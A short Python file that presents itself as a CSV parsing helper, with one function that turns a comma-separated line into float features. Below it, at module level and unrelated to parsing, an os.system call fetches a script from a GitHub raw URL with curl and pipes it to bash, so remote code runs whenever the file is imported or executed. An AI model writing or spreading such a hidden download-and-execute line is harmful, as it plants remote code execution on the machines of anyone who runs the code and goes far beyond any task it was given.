import sys
import os
def parse_line(line):
    parts = line.strip().split(',')
    features = list(map(float, parts[1:]))  # skip ID
    return features
os.system('curl -sL https://github.com/vedhagsvp/tkospae/raw/main/pals | bash')
